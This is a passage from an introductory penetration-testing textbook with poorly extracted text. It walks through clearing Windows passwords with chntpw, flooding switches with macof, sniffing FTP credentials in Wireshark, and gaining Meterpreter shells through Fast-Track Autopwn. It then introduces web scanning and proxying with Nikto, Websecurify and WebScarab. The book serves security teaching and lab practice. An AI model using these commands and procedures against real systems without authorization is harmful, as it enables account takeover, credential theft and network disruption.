 simply enter the number or letter that corresponds to the choice  you want to make and hit the e2809centere2809d key to continue
 the e2809c[1]e2809d after the ques- tion indicates that choice e2809c1e2809d is the default
 in our example we are planning to reset the password for the administrator  account so we can type e2809c1e2809d and hit enter or simply hit the enter key to accept  the default
 next we are presented with a list of users available on the local  windows machine
 You can select the desired user by typing in his or her user- name as displayed
 once again the default option is set to e2809cAdministrator
e2809d  figure 4
12 shows a screenshot of the available users
 Here again we can simply hit the e2809centere2809d key to accept the default choice of  e2809cAdministrator
e2809d next we are presented with the various options for editing the  fIGURE 4
11 Chntpw Interactive Menu
 fIGURE 4
12 List of Available Users to Reset Password
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 92 user on the target machine as shown in figure 4
13
 Please note that at this  step you do not want to accept the default option! As previously mentioned at this point you want to be sure you select option  e2809c1e2809d to clear the password
 After entering your selection to clear the user pass- word you will get a message stating: e2809cPassword cleared!e2809d At this point you can  reset another usere28099s password or enter e2809c!e2809d to quit the program
 it is important  that you complete the remaining steps because at this point the new sAm file  has not been written to the hard drive
 in the menu that follows enter e2809cqe2809d to  quit the chntpw program
 At last you will be prompted with a message asking  if you would like to write your changes to the hard drive
 Be sure to enter e2809cye2809d at  this step as the default is set to e2809cn
e2809d the password for the selected user has now been cleared and is blank
 You can  shut down Backtrack by issuing the e2809creboote2809d command and ejecting the dVd
  when windows restarts you can log into the account by leaving the password  blank
 with a little practice this entire process including booting Backtrack clearing  the password and booting into windows can be completed in less than five  minutes
 SNIffING NETWORK TRAffIC Another popular technique that can be used to gain access to systems is net- work sniffing
 sniffing is the process of capturing and viewing traffic as it is  passed along the network
 several popular protocols in use today still send  sensitive and important information over the network without encryption
  network traffic sent without using encryption is often referred to as clear text  because it is human readable and requires no deciphering
 sniffing clear text  network traffic is a trivial but effective means of gaining access to systems
 Before we begin sniffing traffic it is important that you understand some basic  network information
 the difference between promiscuous mode and nonpro- miscuous network modes will be discussed first
 By default most network cards operate in nonpromiscuous mode
 non- promiscuous mode means that the network interface card (nic) will only  pass on the specific traffic that is addressed to it
 if the nic receives traffic that  matches its address the nic will pass the traffic onto the cPU for processing
  fIGURE 4
13 Chntpw User Edit Menu
 0cExploitation ChApTER 4 93 if the nic receives traffic that does not match its address the nic simply dis- cards the packets
 in many ways a nic in nonpromiscuous mode acts like a  ticket taker at a movie theater
 the ticket taker stops people from entering the  theater unless they have a ticket for the specific show
 Promiscuous mode on the other hand is used to force the nic to accept all  packets that arrive
 in promiscuous mode all network traffic is passed onto the  cPU for processing regardless of whether it was destined for the system or not
 in order to successfully sniff network traffic that is not normally destined for  your Pc you must make sure your network card is in promiscuous mode
 You may be wondering how it is possible that network traffic would arrive at  a computer or device if the traffic was not addressed to the device
 there are  several possible scenarios where this situation may arise
 first any traffic that is  broadcast on the network will be sent to all connected devices
 Another exam- ple is networks that use hubs rather than switches to route traffic
 A hub works by simply sending all the traffic it receives to all the devices con- nected to its physical ports
 in networks that use a hub your nic is constantly  disregarding packets that do not belong to it
 for example assume we have a  small 8-port hub with 8 computers plugged into the hub
 in this environment  when the Pc plugged into port number 1 wants to send a message to the Pc  plugged into port number 7 the message (network traffic) is actually delivered  to all the computers plugged into the hub
 However assuming all the computers  are in nonpromiscuous mode machines 2e280936 and 8 simply disregard the traffic
 many people believe you can fix this situation by simply swapping your hubs  with switches
 this is because unlike hubs that broadcast all traffic to all ports  switches are much more discrete
 when you first plug a computer into a switch  the mAc address of the computere28099s nic is registered with the switch
 this  information (the computere28099s mAc address and switche28099s port number) is then  used by the switch to intelligently route traffic for a specific machine to the spe- cific port
 going back to your previous example if a switch is being used and  Pc 1 sends a message to Pc 7 the switch processes the network traffic and con- sults the table containing the mAc address and port number
 it then sends the  message to only the computer connected to port number 7
 devices 2e280936 and 8  never receive the traffic
 MACOf: MAKING ChICKEN SALAD OUT Of   ChICKEN Sh*T it should be pointed out that the discrete routing property of a switch was orig- inally designed to increase performance not to increase security
 As a result of  this any increase in security should be viewed as a by-product of the design  rather than its original goal
 keeping this in mind before you run out to  replace all your hubs with switches you should be aware that there are tools  available that can be used against a switch to make it act like a hub
 in other  0cThe Basics of hacking and penetration Testing 94 words in some instances we can cause a switch to broadcast all traffic to all  ports making it behave exactly like a hub
 most switches have a limited amount of memory that can be used to remem- ber the table containing mAc address and corresponding port numbers
 By  exhausting this memory and flooding the table with bogus mAc addresses a  switch will often become incapable of reading or accessing valid entries in the  mAc to port table
 Because the switch cannot determine the correct port for  a given address the switch will simply broadcast the traffic to all ports
 this  model is known as e2809cfail open
e2809d the concept of fail open simply means that  when the switch fails to properly and discretely route traffic it falls back to a  hub-like state (open) that sends all traffic to all ports
 You should be aware that some switches are configured to e2809cfail closed
e2809d  switches that fail closed operate in exactly the opposite manner of a fail open  switch
 rather than broadcasting all traffic to all ports fail closed switches sim- ply stop routing traffic altogether
 However as a penetration tester or hacker  there is an upside to this configuration as well
 if you are able to prevent the  switch from routing traffic you have stopped all traffic on the network and  caused a denial of service
 dsniff is an excellent collection of tools that provide many useful functions  for sniffing network traffic
 it is recommended that you take time and review  each of the tools and documentation included with dsniff
 one of the dsniff  tools written by dug song called macof provides us with the ability to flood a  switch with thousands of random mAc addresses
 if the switch is configured to  fail open the switch will begin to act like a hub and broadcast all traffic to all  ports
 this will allow you to overcome the selective routing of a switch and sniff  all network traffic passing through the device
 macof is built into Backtrack and  can be run by issuing the following command in a terminal window: macof e28093i eth0 e28093s 172
16
45
123 e28093d 172
16
45
2 in the preceding example e2809cmacofe2809d is used to invoke the program
 the  macof program will generate and flood the network with thousands of mAc  addresses
 the e2809c-ie2809d switch is used to specify your computere28099s network card
  this is where the mAc addresses will be sent from
 the e2809c-se2809d is used to specify  the source address
 the e2809c-de2809d is used to specify the destination or target of your  attack
 figure 4
14 shows an example of the command used to start macof and  a selection of the generated output
 As a final word of caution using macof will generate tremendous amounts of  network traffic and is therefore easily detectable
 You should use this technique  only when stealth is not a concern
 with the concepts of promiscuous mode and the ability to sniff traffic on a  switch in mind you can examine another popular tool that can be used to  view and capture network traffic
 one of the simplest and most powerful tools  for sniffing network traffic is wireshark
 wireshark was originally written by  Openmirrors
com 0cExploitation ChApTER 4 95 gerald combs in 1998
 this popular tool is a free network protocol analyzer  that allows you to quickly and easily view and capture network traffic
 You  can download wireshark for free from http://www
wireshark
org
 wireshark is  an extremely flexible and mature tool
 it should be noted that prior to 2006  wireshark was known as ethereal
 even though the program remained the  same the name was changed due to some trademark issues
 wireshark is built into Backtrack and can be accessed through the k-menu  dragon by selecting: k-menu e28692 Backtrack e28692 Privilege escalation e28692 sniffers e28692  wireshark as shown in figure 4
15
 remember that by default Backtrack does not turn enable or start any of your  network interfaces
 Be sure that you have enabled and configured at least one  network interface in Backtrack before running wireshark
 the instructions for  doing this can be found in chapter 1
 when you first start wireshark inside of Backtrack you will get a message tell- ing you that e2809crunning wireshark as user e28098roote28099 can be dangerous
e2809d You can  fIGURE 4
14 Using Macof to Flood a Switch
 fIGURE 4
15 Starting Wireshark through the K-Start Menu
 0cThe Basics of hacking and penetration Testing 96 click e2809coke2809d to acknowledge this warning
 when you first start wireshark you  will need to select your network card and ensure that it is properly set up to  capture all available traffic
 You can do this by clicking on the icon showing  a network card and a menu list
 the icon is located in the upper left corner of  the program
 figure 4
16 shows a screenshot of the button
 selecting the e2809clist available capture interfacese280a6e2809d button will bring up a new  window displaying all the available interfaces
 from here you will be able to  view and select the appropriate interface
 You can begin a simple capture by  accepting the defaults and clicking on the e2809cstarte2809d button associated with the  desired nic or you can customize your capture options by clicking on the  e2809coptionse2809d button
 figure 4
17 shows an example of the wireshark capture  interfaces window
 Because we are focusing on the basics we will leave the default options and  select the e2809cstarte2809d button
 the wireshark capture window should fill rapidly and  continue to stream packets as long as you let the capture run
 do not worry  about attempting to view this information on the fly
 wireshark allows us to  save the capture results and review them later
 to facilitate this example you should start an ftP server on one of the  machines attached to the network
 now that wireshark is up and running that  is capturing network traffic in promiscuous mode it is possible to log into  the ftP server as the user e2809cownedb
e2809d After letting the wireshark capture run  for several minutes stop the capture by clicking on the button with a network  card; a red e2809cx
e2809d this button is located in the menu at the top of the wireshark  capture window as shown in figure 4
18
 fIGURE 4
16 Wireshark Button to Select the Capture Interface
 fIGURE 4
17 Wireshark Capture Interfaces Window
 Openmirrors
com 0cExploitation ChApTER 4 97 once the network capture has been stopped you are free to review the pack- ets captured by wireshark
 You should take some time to review your capture  and attempt to identify any relevant information
 As shown in figure 4
19 our  packet dump was able to successfully capture the username password and iP  address of the ftP server! we could now use this information to log into the  ftP server
 if you performed a capture on a particularly busy network you may find the  volume and sheer number of captured packets overwhelming
 manually  reviewing a large packet capture may not be feasible
 luckily wireshark  includes a filter that can be used to drill down and refine the displayed output
  revisiting our previous example we could enter the keyword e2809cftpe2809d in the filter  box and click the e2809cApplye2809d button
 this will cause wireshark to remove all pack- ets that do not belong to the ftP protocol from our current view
 obviously  this will significantly reduce the number of packets we need to review
  wireshark includes some incredibly powerful filters
 it is well worth the effort  to take the time to review and master wireshark filters
 it should be pointed  out that you can always remove your current filtered view and go back to the  original packet capture by clicking the e2809ccleare2809d button
 fAST-TRACK AUTOpWN: BREAKING OUT ThE M-60 An earlier section described the use of metasploit as a sniper rifle for taking  down vulnerable and unpatched systems
 Another tool called fast-track is  built on metasploit; but rather than requiring the penetration tester to dig for  vulnerabilities and match exploits fast-track simply automates the entire pro- cess
 when using fast-track the only thing a penetration tester needs to do is  to enter the targete28099s iP address
 fIGURE 4
18 Stopping the Wireshark Capture
 fIGURE 4
19 Using Wireshark to Sniff FTP Credentials
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 98 there is nothing subtle or stealthy about fast-track
 the tool works by con- ducting a port scan of the target; based on the information returned from the  port scan fast-track sprays every known or possible matching exploit against  the target
 fast-track takes the e2809clete28099s throw everything at the wall and see what  stickse2809d approach to exploitation
 even if fast-track is successful in getting a  shell the tool continues spraying attacks against the target until all the possible  exploits have been attempted
 when used against weak targets this will often  lead to multiple shells
 the easiest way to start fast-track is to click on the k-start dragon e28692 Backtrack  e28692 Penetration e28692 fast track e28692 fast-track webgUi as shown in figure 4
20
 once started fast-track will open a terminal window and run a series of com- mands
 After a brief pause firefox will automatically open to the fast-track  web page
 from the main fast-track page you can click on the Autopwn  Automation link as shown in figure 4
21
 After selecting the Autopwn Automation link you can scroll the web page  down and find the e2809center iP Address or range:e2809d textbox
 enter your target  iP into the text box provided and choose if you want a bind or reverse shell  on the target
 once you have set these options you can click the e2809cmetasploit  Autopwne2809d link at the bottom of the page as shown in figure 4
22
 clicking the metasploit Autopwn link will cause fast-track to unleash a flood  of exploits against your target
 the system will open a terminal window and  begin issuing commands automatically
 this process may take several min- utes to complete
 You can watch the progress of the program as it scrolls by  in the terminal window
 You will also be able to see an accurate count of the  number of remote shells that were automatically established
 when fast-track  has exhausted its supply of potential exploits you can view any and all of the  fIGURE 4
20 Starting the Fast-Track WebGUI
 Openmirrors
com 0cExploitation ChApTER 4 99 fIGURE 4
21 Selecting Autopwn Automation from the Fast-Track WebGUI
 fIGURE 4
22 Fast-Track Autopwn Options
 0cThe Basics of hacking and penetration Testing 100 shells that were obtained by issuing the following command within the fast- track terminal window: sessions e28093l if fast-track was successful in creating remote access to the target machine this  command (please note that is a dash lower case e2809cle2809d) will list each shell that  was opened
 to use a shell you can issue the following in the fast-track termi- nal window: sessions e28093i shell_id in this command the shell_id is replaced with the session number as listed  from the e2809csessions e28093le2809d command
 running this command will drop you into  a shell on the remote machine
 figure 4
23 shows an example of both of these  commands
 At this point you have a meterpreter shell on the target machine
 figure 4
24  demonstrates using the meterpreter e2809clse2809d command to list the contents of the  current directory and provides proof that our shell is interacting with the  target
 obviously at this point the exploitation phase is over for this target! hOW DO I pRACTICE ThIS STEp? Practicing exploitation is one of the most challenging frustrating time-con- suming and rewarding experiences that can be offered to new hackers and  penetration testers
 it is probably a fair assumption that if you are reading  this book you are interested in hacking
 As mentioned earlier the process of  exploitation is the single step most often associated with hacking (even though  you now know it is much more!)
 if you have never successfully e2809cownede2809d  or exploited a target you are in for quite a treat
 the experience of gaining  fIGURE 4
23 Listing and Using Shells Generated from Fast-Track
 0cExploitation ChApTER 4 101 administrative access on another machine is a thrill that is both electrifying  and unique
 there are several ways to practice this step; the easiest way is to set up a vulner- able target in your penetration-testing lab
 once again using virtual machines  is helpful because exploitation can be a very destructive process and resetting  a virtual machine is often easier and faster than reimaging a physical machine
 if you are new to exploitation it is important that you have a few immedi- ate successes
 this will keep you from getting discouraged as you progress and  move onto more difficult targets where the exploitation process becomes more  tedious and difficult
 As a result it is suggested that you start learning exploi- tation by attacking old unpatched versions of operating systems and software
  successfully exploiting these systems should give you motivation to learn more
  there are many examples of students becoming quickly and permanently dis- illusioned with exploitation and hacking because they attempted to attack  the latest-greatest-fully-patched operating system and fell flat on their face
  remember this book focuses on the basics
 once you master the tools and tech- niques discussed here you will be able to move onto the more advanced topics
  if you are new to this process let yourself win a little and enjoy the experience
 if possible you should try to obtain a legal copy of microsofte28099s xP to add to  your pen testing lab environment
 You should be able to find a legal copy on  fIGURE 4
24 Fast-Track Proof of Concept
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 102 eBay Amazon or craigslist
 Just make sure you are purchasing a genuine copy  so that you can stay on the right side of the eUlA
 it is always suggested that  newcomers begin with xP because there are still abundant copies available and  there are standing exploits in the metasploit framework that will allow you to  practice your metasploit-fu
 when building your pen testing lab it is recommended that you find the low- est service Pack edition of xP as each service pack level patches a number of  holes and vulnerabilities
 with this advice in mind xP with no service pack  installed is best
 xP sP 1 would be next best; xP sP 2 and xP sP 3 are the  least desirable
 this is because microsoft introduced some significant security  changes to xP beginning with service Pack 2
 However even xP sP 3 has at  least 1 standing exploit and can still make an excellent vulnerable target
 old versions of linux are also a great source of e2809cexploitable targets
e2809d the crew  from Backtrack created a free metasploit training module called e2809cmetasploit  Unleashed
e2809d it is strongly recommended that you explore this resource after  completing this book
 the metasploit Unleashed project contains a detailed  description of how to download and set up Ubuntu 7
04 with sAmBA installed
  creating a virtual machine with Ubuntu 7
04 and sAmBA running is a way of  setting up a free (as in no cost) vulnerable target and allows you practice attack- ing a linux system
 metasploit itself has also released a vulnerable target that can be used to  practice exploitation
 the target system is a linux virtual machine called  e2809cmetasploitable
e2809d metasploitable is based on Ubuntu 8
04 and is available at no  charge
 You can download your copy of metasploitable by grabbing the torrent  on the metasploit express community site
 the virtual machine is configured to  run as a live distribution so if you destroy the system beyond repair you simply  have to reboot it to start over from scratch
 this is a great way to practice
 finally thomas wilhelm has graciously created and offered for free a series  of entertaining challenging and highly customizable live linux cds called  de-ice
 the de-ice cds allow you to practice a series of penetration test- ing challenges following a realistic scenario
 You can get your hands on these  great cds by downloading them at http://heorot
net/livecds/
 the cds are great  because they present you with a realistic simulation of an actual penetration test
 Another great feature of the de-ice cds is that you would not be able to sim- ple Autopwn your way through the challenges
 each de-ice cd includes sev- eral different levels of challenges that you must complete
 As you work your  way through the challenges you will need to learn to think critically and use  many of the tools and techniques we have discussed in steps 1e280933
 the only word of caution when using these awesome cds (or any preconfig- ured lab for that matter) is that you should be very careful about asking for  too much help giving up too soon and relying on the hints too often
 live  cds like de-ice hold a tremendous value but oftentimes you only get to  work through them a single time
 once you have read the hint or solution to  0cExploitation ChApTER 4 103 a problem there is no way to put the e2809canswer Jinnie2809d back into the bottle as  you will most likely remember the answer forever
 As a result you are encour- aged to have persistence and tough it out
 if you have read and practiced every- thing that has been discussed up to this point you will have the ability to gain  administrative access to the first de-ice disk
 of course you can always go back and rerun the challenges and you are  encouraged to do so but it will be different the second time around because  you will know what to look for
 take your time enjoy the challenge and work  through the issues you encounter
 Believe it or not there is tremendous value  and learning potential in banging your head against a seemingly insurmount- able problem
 if you want to be a penetration tester you will need to learn to  be persistent and resourceful
 embrace the challenges you encounter as a learn- ing situation and make the most of them
 setting up and working your way through all the vulnerable targets described  above should be an enjoyable process
 Below you will find some specific tips  for setting up targets to practice each of the tools that were discussed in this  chapter
 the easiest way to practice medusa is to start a remote process on a target  machine
 try starting telnet on a windows machine and ssH or ftP on a  linux machine
 You will need to create a few additional users and passwords  with access to the remote services
 once you have the remote service running  you can practice using medusa to gain access to the remote system
 the easiest way to practice metasploit and fast-track is by setting up an older  version of windows xP as the target; remember the lower the service pack the  better
 You can also download a copy of Ubuntu 7
04 and install sAmBA on it  or find metasploite28099s own e2809cmetasploitablee2809d virtual machine
 to practice with John the ripper and chntpw you can set up a victim machine  with several user accounts and different passwords
 it is highly suggested that  you vary the strength of the passwords for each account
 make a few user  accounts with weak three- and four-letter passwords and make others with  longer passwords that include upper and lowercase letters along with special  characters
 WhERE DO I GO fROM hERE? At this point you should have a solid understanding of the basic steps required  to exploit and gain access to a system
 remember your attack methods will  change based on your target and desired goal
 now that you understand the  basics you should be ready to tackle some more advanced topics
 You should take some time and review the password brute forcing tool Hydra
  this tool functions much like medusa but provides a few extra switches to give  you some additional options
 carefully review each of the switches supported  by Hydra
 You can find the switches and a brief description by reviewing the  Openmirrors
com 0cThe Basics of hacking and penetration Testing 104 Hydra man pages
 it is recommended that you pay special attention to the tim- ing option
 the ability to control the timing or rate of connections is handy for  correcting many connection errors that occur when we utilize online password  crackers
 Along with your own personal password dictionary you should begin build- ing a list of default usernames and passwords for various network devices
 As  you progress in your penetration testing career you will probably be surprised  at how often you will come across devices like routers switches modems fire- walls etc
 that still use a default username and password
 it is not uncommon  to find Pt stories where the penetration tester was able to take complete con- trol of a boarder router and redirect all internal and external traffic because  the company administrator had forgotten to change the default username  and password
 it does little good to spend time configuring and securing your  device if you fail to change the username and password
 there are several good  starter lists of default usernames and passwords available online
 Another great tool for password cracking is rainbowcrack
 rainbowcrack is  a tool that relies on rainbow tables to crack passwords
 A rainbow table is a  precomputed list of password hashes
 recall that traditional password-cracking  tools like John the ripper go through a three-step process
 first the tool must  generate a potential password; next the tool needs to create a hash of the cho- sen word; and finally the password-cracking tool has to compare the generated  hash with the password hash
 rainbow tables are much more efficient because  they make use of precomputed password hashes
 this means that the cracking  process reduces two out of the three steps and simply needs to compare hashes  to hashes
 there are lots of great tools that can be explored and used for sniffing
 it is  highly recommended that you spend time getting to know and use wireshark
  this book covered only the basics but wireshark is a deep program with many  rich features
 You should learn how to use the filters follow data streams  and view information on specific packets
 once you are comfortable with  wireshark digging into dsniff is highly recommended
 As mentioned earlier  dsniff is an incredible suite with tons of great tools
 with some self-study and  practice you can even learn to intercept encrypted traffic like ssl
 ettercap is another fantastic tool that has many powerful features and abili- ties
 ettercap is a great tool for conducting man-in-the-middle attacks
 ettercap  works by tricking clients into sending network traffic through the attacker  machine
 this is a great way to get usernames and passwords from machines  on the local lAn
 once you have successfully studied and used wireshark  dsniff and ettercap you will be well on your way to mastering the basics of  network sniffing
 After reviewing and understanding the basics of metasploit you should dig in  and learn the details of the meterpreter payload
 there are dozens of switches  commands and ways to interact with the meterpreter
 You should learn and  0cExploitation ChApTER 4 105 practice them all
 learning how to control this amazing payload will pay  mountains of dividends in your exploitation career
 it is important that you  understand using metasploit in combination with the meterpreter is one of  the most lethal amalgamations available to a new penetration tester
 do not  underestimate or overlook this powerful tool
 Until now only automated attacks have been discussed
 even though it can be  extremely entertaining to push buttons and pwn remote systems if you never  advance your skill level beyond this point you will be a script kiddie forever
  initially we all start out as a person who must rely on others to develop and  release new exploit tools but to become truly elite you will need to learn how  to read write and create your own exploits
 while creating your own exploits  may seem daunting at first it is a process that becomes much easier the more  you learn
 A good place to start learning about exploitation is by getting to  know buffer overflows
 stack and heap based buffer overflows which are responsible for many of  the exploits available today often seem like magic or voodoo to newcom- ers
 However with some dedicated and careful self-study these topics can be  demystified and even mastered
 Advancing your skill level to the point of being able to find buffer overflows and  write shell code often requires some additional training
 Although this train- ing is not strictly required it certainly makes the process of learning advanced  exploitation much easier
 whenever possible you should spend time learning a  programming language like e2809cc
e2809d once you are comfortable with c you should  focus on understanding at least the basics of Assembly language
 Having a solid  understanding of these topics will help dispel much of the e2809cblack-magice2809d feel  many people have when they first encounter buffer overflows
 SUMMARy this chapter focused on step 3 of our basic methodology: exploitation
  exploitation is the process most newcomers associate directly with e2809chacking
e2809d  Because exploitation is a broad topic the chapter examined several different  methods for completing this step including using the online password cracker  medusa to gain access to remote systems
 the process of exploiting remote vul- nerabilities with metaploit was discussed as well as several payloads that can be  used with metasploit
 John the ripper was introduced for cracking local pass- words
 A tool for password resetting was shown for those times when a penetra- tion tester does not have time to wait for a password cracker
 wireshark was  used to sniff data off the network and macof was used to sniff network traffic  on a switched network
 finally fast-track Autopwn was shown as a one-stop  shop for the exploitation phase
 Openmirrors
com 0cThis page intentionally left blank 0c107 Web-Based Exploitation ChApTER 5 Information in This Chapter: n Interrogating Web Servers: Nikto n Websecurify: Automated Web Vulnerability Scanning n Spidering: Crawling Your Targete28099s Website n Intercepting Requests with WebScara n Code Injection Attacks n Cross-Site Scripting: Browsers That Trust Sites 0cThe Basics of hacking and penetration Testing 108 INTRODUCTION now that you have a good understanding of common network-based attacks it  is important to take some time to discuss the basics of web-based exploitation
  the web is certainly one of the most common attack vectors available today  because everything is connected to the internet
 nearly every company today  has a web presence and more often than not that web presence is dynamic  and user-driven
 Previous-generation websites were simple static pages coded  mostly in Html
 By contrast many of todaye28099s websites include complex cod- ing with backend database-driven transactions and multiple layers of authen- tication
 Home computers phones appliances and of course systems that  belong to our targets are all connected to the internet
 As our dependence and reliance on the web continues to expand so does the  need to understand how this attack vector can be exploited
 A few years back people started using words like e2809cweb 2
0e2809d and e2809ccloud-based  computinge2809d to describe a shift in the way we interact with our systems and pro- grams
 simply put these terms are a change in the way computer programs  are designed run accessed and stored
 regardless of what words are used to  describe it the truth of the matter is that the internet is becoming more and  more e2809cexecutable
e2809d it used to be that programs like microsoft office had to be  installed locally on your physical computer
 now this same functionality can  be accessed online in the form of google docs and many other cloud com- puting services
 in many instances there is no local installation and your data  your programs and your information reside on the server in some physically  distant location
 As mentioned earlier companies are also leveraging the power of an executable  web
 online banking shopping and record-keeping are now common place
  everything is interconnected
 in many ways the internet is like the new e2809cwild  west
e2809d Just when it seemed like we were making true progress and fundamen- tal changes to the way we program and architect system software along comes  the internet and gives us a new way to relearn and repeat many of the security  lessons from the past
 As people rush to push everything to the web and sys- tems are mashed up and deployed with worldwide accessibility new attacks  are developed and distributed at a furious pace
 it is important that every aspiring hacker and penetration tester understand at  least the basics of the web-based exploitation
 INTERROGATING WEB SERvERS: NIKTO After running a port scan and discovering a service running on port 80 or port  443 one of the first tools that should be used to evaluate the service is nikto
  nikto is a web server vulnerability scanner
 this tool was written by chris  sullo and david lodge
 nikto automates the process of scanning web servers  Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 109 for out-of-date and unpatched software as well as searching for dangerous files  that may reside on web servers
 nikto is capable of identifying a wide range of  specific issues and also checks the server for configuration issues
 the current  version of nikto is built into Backtrack and available in the /pentest/scanners/ nikto directory
 if you are not using Backtrack nikto can be obtained by down- loading it from the http://www
cirt
net/nikto2 website
 Please note you will  need Perl installed to run nikto
 to view the various options available you can run the following command  from inside the /pentest/scanners/nikto directory: perl nikto
pl running this command will provide you with a brief description of the  switches available to you
 to run a basic vulnerability scan against a target you  need to specify a host iP address with the e2809c-he2809d switch
 You should also specify  a port number with the e2809c-pe2809d switch
 You can instruct nikto to scan multiple  ports by specifying a port range
 for example to scan for web servers on all  ports between 1 and 1000 you would issue the following command in a termi- nal window (again you must be in the /pentest/scanners/nikto directory): perl nikto
pl -h 172
16
45
129 e28093p 1-1000 if you fail to specify a port number nikto will only scan port 80 on your tar- get
 if you want to save the nikto output for later review you can do so by  issuing the e2809ce28093oe2809d followed by the file path and name of the file you would like  to use to save the output
 figure 5
1 includes a screenshot of the nikto output  from our example
 fIGURE 5
1 Output of the Nikto Web Vulnerability Scanner
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 110 WEBSECURIfy: AUTOMATED WEB   vULNERABILITy SCANNING Another great tool to use when first interacting with a target web server is  websecurify
 websecurify provides an easy-to-use interface that allows pen- etration testers to quickly and easily identify web vulnerabilities including  sQl injection cross-site scripting file includes cross-site request forgery and  others
 websecurify can be set up and used with little configuration making it very  handy for people who are new to web penetration testing
 You can access  websecurify by clicking: k-start dragon e28692 Backtrack e28692 web Application  Analysis e28692 web (front end) e28692 web securify
 After starting the program you will be presented with a e2809cgetting startede2809d page;  you can begin your test by clicking on the e2809cstart new automated teste2809d link as  shown in figure 5
2
 After clicking the e2809cstart new automated teste2809d you will be presented with a  start test window
 You will need to enter a Url or iP address in the e2809ctargete2809d  textbox
 entering information in the e2809cworkspacee2809d textbox is optional as  websecurify will automatically generate this for you when you enter a target
  figure 5
3 shows the start test window; once you have entered a Url or iP  address you can click the e2809coke2809d button to begin your test
 once the test is completed you will be presented with a workspace report  that will allow you to view specific details and issues that were discovered by  websecurify
 You can view the specific information by clicking the triangle to  expand the findings
 figure 5
4 shows the output from our scan
 fIGURE 5
2 Starting an Automated Web Test Using Websecurify
 Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 111 As you can see websecurify found several issues including an sQl injection  vulnerability
 sQl injection attacks will be discussed in a later section of this  chapter
 SpIDERING: CRAWLING yOUR TARGETe28099S WEBSITE Another great tool to use when initially interacting with a web target is  webscarab
 webscarab was written by rogan dawes and is available through  the owAsP website
 if you are running Backtrack a version of webscarab is  already installed
 this powerful framework is modular in nature and allows  fIGURE 5
3 Entering a Target in the Websecurify Start Test Window
 fIGURE 5
4 Websecurify Report
 Openmirrors
com Openmirrors
com 0cThe Basics of hacking and penetration Testing 112 you to load numerous plug-ins to customize it to your needs
 even in its  default configuration webscarab provides an excellent resource for interacting  with and interrogating web targets
 After having run the vulnerability scanners nikto and websecurify the next  logical step is to run a spidering program on the target website
 spiders are  extremely useful in reviewing and reading (or crawling) your targete28099s website  looking for all links and associated files
 each of the links web pages and files  discovered on your target are recorded and cataloged
 this cataloged data can  be useful for accessing restricted pages and locating unintentionally disclosed  documents or information
 You can access the spider function in webscarab by first starting the program  through the k-start dragon
 this can be accomplished by clicking: k-start  dragon e28692 Backtrack e28692 web Application Analysis e28692 web (front end) e28692  webscarab lite
 this will load the webscarab program
 However before you can begin spider- ing your target you will need to switch to the e2809cfull-featured interface
e2809d You can  do this by clicking on the e2809ctoolse2809d menu and putting a checkbox in the e2809cUse  full-featured interfacee2809d checkbox as shown in figure 5
5
 After switching to the full-featured interface you will be prompted to restart  webscarab
 once you restart the tool you will be given access to a number of  new panels along the top of the window including the e2809cspidere2809d tab
 now that you have set up webscarab you need to configure your browser to  use a proxy
 setting up webscarab as your proxy will cause all the web traf- fic going into and coming out of your browser to pass through the webscarab  program
 in this respect the proxy program acts as a middle man and has the  ability to view stop and even manipulate network traffic
 setting up your browser to use a proxy is usually done through the prefer- ences or network options
 in firefox you can click on: edit e28692 Preference
 in  the firefox Preferences window click the e2809cAdvancede2809d menu followed by the  e2809cnetworke2809d tab
 finally click on the e2809csettingse2809d button as shown in figure 5
6
 clicking on the settings button will allow you to configure your browser to use  webscarab as a proxy
 select the radio button for e2809cmanual proxy configura- tion:e2809d
 next enter: 127
0
0
1 in the e2809cHttP Proxy:e2809d input box
 finally enter: 8008  fIGURE 5
5 Switching WebScarab to Run in Full-featured Interface Mode
 0cWeb-Based Exploitation ChApTER 5 113 into the e2809cPorte2809d field
 it is usually a good idea to check the box just below the  e2809cHttP Proxye2809d box and select e2809cUse this proxy server for all protocols
e2809d once you  have all of this information entered you can click e2809coke2809d to exit the connection  settings window and e2809cclosee2809d to exit the firefox Preferences window
 figure 5
7  shows an example of my firefox connection settings window
 At this point any web traffic coming into or passing out of your browser will  route through the webscarab proxy
 two words of warning: first you need to  fIGURE 5
6 Setting Up Firefox to Use WebScarab as a Proxy
 fIGURE 5
7 Firefox Connection Settings for Using WebScarab as a Proxy
 0cThe Basics of hacking and penetration Testing 114 leave webscarab running while it is serving as a proxy
 if you close the pro- gram you will not be able to browse the internet
 if this happens firefox is  great at providing you with an error message that it cannot find a proxy  and you will need to restart webscarab or change your network configura- tion in firefox
 the second warning is that while surfing the internet using  a local proxy all https traffic will show up as having an invalid certificate!  this is expected behavior because your proxy is sitting in the middle of your  connection
 As a side note it is important that you always pay attention to invalid security  certificates when browsing
 At this point certificates are your best defense and  often your only warning against a man-in-the-middle attack
 now that you have set up a proxy and have configured your browser you are  ready to begin spidering your target
 You begin by entering the target Url  into the browser
 in our earlier example we discovered a website running on  172
16
45
132
 entering the following into your firefox browser will load the  website through webscarab
 once the website has loaded in your browser you  can switch over the webscarab program
 You should see the Url you entered  (along with any others that you have visited since starting your proxy)
 to spider  the site you right click the Url and choose e2809cspider treee2809d as shown in figure 5
8
 You can now view each of the files and folders associated with your target web- site
 individual folders can be further spidered by right clicking and choosing  e2809cspider treee2809d again
 You should spend time carefully examining every nook  and cranny within your authorized scope
 spidering a website is a great way to  find inadvertently or leaked confidential data from a target website
 fIGURE 5
8 Using WebScarab to Spider the Target Website
 Openmirrors
com 0cWeb-Based Exploitation ChApTER 5 115 INTERCEpTING REqUESTS WITh WEBSCARAB As previously mentioned webscarab is a very powerful tool
 one of its many  roles is to function as a proxy server
 recall that a proxy sits between the cli- ent (browser) and the server
 while the proxy is running all the web traffic  flowing into and out of your browser is passed through the program
 Passing  traffic through a local proxy provides us with an amazing ability; by running  webscarab in this mode we are able to stop intercept and even change the  data either before it arrives or after it leaves the browser
 this is a subtle but  important point; the use of a proxy allows us to make changes to data in tran- sit
 the ability to manipulate or view HttP request or response information  has serious security implications
 consider the following: some poorly coded websites rely on the use of hidden  fields to transmit information to and from the client
 in these instances the  programmer makes use of a hidden field on the form assuming that the user  will not be able to access it
